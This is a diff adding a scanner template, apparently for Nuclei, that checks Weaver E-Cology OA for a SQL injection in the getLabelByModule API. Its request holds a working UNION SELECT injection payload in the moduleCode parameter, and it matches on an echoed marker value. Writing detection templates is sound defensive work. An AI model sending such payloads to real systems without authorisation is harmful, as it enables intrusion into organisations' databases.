@@ -1,0 +1,21 @@
+id: poc-yaml-weaver-e-office-getlabelbymodule-sqli
+info:
+  name: 泛微OA E-Cology getLabelByModule SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - method: GET
+    path:
+      - "/api/ec/dev/locale/getLabelByModule?moduleCode=1') union all select '66666666,' --"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "datas"
+          - "typeList"
+          - "66666666"
